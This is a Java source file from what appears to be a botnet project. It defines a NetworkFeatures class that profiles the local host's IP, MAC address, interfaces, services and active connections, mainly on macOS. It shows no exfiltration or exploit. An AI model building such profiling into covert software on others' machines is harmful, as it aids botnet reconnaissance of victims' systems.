/*
  The MIT License (MIT)

  Copyright (c) 2016 Giacomo Marciani and Michele Porretta

  Permission is hereby granted, free of charge, to any person obtaining a copy
  of this software and associated documentation files (the "Software"), to deal
  in the Software without restriction, including without limitation the rights
  to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
  copies of the Software, and to permit persons to whom the Software is
  furnished to do so, subject to the following conditions:


  The above copyright notice and this permission notice shall be included in
  all copies or substantial portions of the Software.


  THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL THE
  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
  THE SOFTWARE.
 */

package com.acmutv.botnet.core.analysis;

import com.acmutv.botnet.core.exception.BotAnalysisException;
import com.acmutv.botnet.tool.net.ConnectionManager;
import com.acmutv.botnet.tool.runtime.MacOsxSysInfoTools;

import lombok.AllArgsConstructor;
import lombok.Data;
import lombok.NoArgsConstructor;

import java.net.SocketException;
import java.net.UnknownHostException;

/**
 * The model of network information.
 * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
 * @author Michele Porretta {@literal <mporretta@acm.org>}
 * @since 1.0
 * @see SystemFeatures
 */
@Data
@AllArgsConstructor
@NoArgsConstructor
public class NetworkFeatures {

	/**
	 * The IP address.
	 */
	private String ip;

	/**
	 * The MAC address.
	 */
	private String MAC;

	/**
	 * Current network information
	 */
	private String CurrentNetworkInformation;

	/**
	 * Network Services of the host
	 */
	private String NetworkServices;

	/**
	 * Network Interfaces
	 */
	private String NetworkInterfaces;

	/**
	 * Active Connections
	 */
	private String ActiveConnections;

	/**
	 * Network Hardware Ports
	 */
	private String NetworkPorts;


	/**
	 * Returns local network features.
	 * @return local network features.
	 * @throws BotAnalysisException when some network features cannot be determined.
	 */
	public static NetworkFeatures getLocal() throws BotAnalysisException {

		String osName = System.getProperty ("os.name");

		String ip = null;
		String mac = null;
		String currentNetworkInformation = null;
		String networkServices = null;
		String networkInterfaces = null;
		String activeConnections = null;
		String networkPorts = null;


		try {
			ip = ConnectionManager.getIP();
		} catch (UnknownHostException exc) {
			throw new BotAnalysisException("Cannot determine IP. %s", exc.getMessage());
		}

		try {
			mac = ConnectionManager.getMAC();
		} catch (UnknownHostException | SocketException exc) {
			throw new BotAnalysisException("Cannot determine MAC. %s", exc.getMessage());
		}

		if(osName.toUpperCase().equals("MAC OS X")){
			MacOsxSysInfoTools osx = new MacOsxSysInfoTools();
			currentNetworkInformation = osx.getCurrentNetworkInformation();
			networkServices = osx.getLocalNetworkServices();
			networkInterfaces = osx.getAllInterfaces();
			activeConnections = osx.getAllActiveConnections();
			networkPorts = osx.getNetworkHardwarePorts();
			
		}else if (osName.toUpperCase().equals("LINUX")){

		}
		else if (osName.toUpperCase().equals("WINDOWS")){

		}else{

		}

		return new NetworkFeatures(ip, mac, currentNetworkInformation, networkServices, networkInterfaces, activeConnections,networkPorts);
	}
}
